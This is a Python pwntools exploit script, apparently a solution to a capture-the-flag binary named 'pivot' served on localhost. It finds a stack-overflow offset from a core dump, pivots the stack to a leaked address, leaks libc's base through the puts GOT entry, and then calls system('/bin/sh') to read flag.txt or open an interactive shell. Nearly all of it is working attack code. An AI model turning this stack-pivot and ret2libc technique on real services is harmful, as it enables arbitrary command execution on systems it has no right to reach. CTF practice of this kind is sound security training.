from pwn import *

# use the following command to have the binary listen on localhost:1234
# socat TCP4-LISTEN:1234,reuseaddr,fork EXEC:./pivot

context.clear(arch="amd64")                   # needed to generate ropchain properly
LOCATION = "./pivot"                          # position of the binary 
LIBC_LOC = "/lib/x86_64-linux-gnu/libc.so.6"  # position of libc
binary   = ELF(LOCATION)      # create object with data from the binary
libc     = ELF(LIBC_LOC)      # create object with data from the libc
ropbin   = ROP(binary)        # create object to help build ropchain to leak libc base address
r = remote("localhost", 1234) # establish connection with the binary
GETSHELL = 0                  # set this to 1 to get a shell instead of just the flag


def overflow():                                         # function used to find return address offset
    log.info("Finding saved return address offset...")                   
    proc = process(LOCATION, timeout=2)                 # start local process 
    proc.recvuntil('> ')                                
    proc.sendline("LMAO")                               # junk data, vulnerable input is the next one
    proc.recvuntil('> ')
    proc.sendline(cyclic(1024, n=8))                    # send cyclic pattern 
    core = Core("core")                                 # create object from data of the core dump
    offset = cyclic_find(core.fault_addr, n=8)          # calculate offset from cyclic pattern
    log.success("Saved return address at offset {0}".format(offset))
    return 'A' * offset                                 # return as much A's as needed


def findPivotAddr():                        # function used to extract pivot address
    r.recvuntil("pivot: ")
    pivotAddress = int(r.recv(14), base=16) # take printed pivot address and format it properly
    log.success("Leaked pivot address at {0}".format(hex(pivotAddress)))
    return pivotAddress


def makeRopToPivot():
    popRax     = ropbin.find_gadget(["pop rax", "ret"])[0] # pop eax gadget
    xchgRaxRsp = 0x0000000000400b02 # xchg rax, rsp -> will pivot rsp to address in rax, dunno why pwntools doesn't find it
    ropPivot  = ""
    ropPivot += p64(popRax)
    ropPivot += p64(findPivotAddr()) # pivot address leaked by binary
    ropPivot += p64(xchgRaxRsp)
    return ropPivot


def makeRopToLeak():                # function used to generate ropchain to leak libc base address
    ropbin.puts(binary.got["puts"]) # call puts with puts' GOT entry as argument
    ropbin.main()                   # call main in order to keep the binary from crashing
    return str(ropbin)              # return ropchain


def makeRopToHack():                                    # function used to craft ropchain for the exploit
    roplib = ROP(libc)                                  # ALWAYS create ropchains from libc AFTER setting base addr
    roplib.system(libc.search("/bin/sh\x00").next())    # append system("/bin/sh") to ropchain
    return str(roplib)


def exploit():
    ################# PHASE 1 - pivot into heap and find libc base address ##################
    padding = overflow()
    ropPivot = makeRopToPivot()  # generate ropchain to pivot esp into heap
    r.recvuntil("> ")
    r.sendline(makeRopToLeak())  # send ropchain to leak libc base address as position to jump to
    r.recvuntil("> ")
    exp  = ""
    exp += padding
    exp += ropPivot              # append ropchain
    r.sendline(exp)                 
    libc.address = u64(r.recv(6) + "\x00\x00") - libc.symbols["puts"] # update libc base address
    log.success("Base address of libc at {0}".format(hex(libc.address)))
    
    ################# PHASE 2 - pwn the process and get command execution ###################
    r.recvuntil("> ")
    exp  = ""
    exp += padding
    exp += makeRopToHack()
    r.recvuntil("> ")
    r.sendline(exp)

    if GETSHELL:
        r.interactive() # set GETSHELL to 1 to get a full shell
    else:
        r.sendline("cat flag.txt && exit") 
        log.success("Flag: " + r.recvall())  # profit

exploit() # start everything
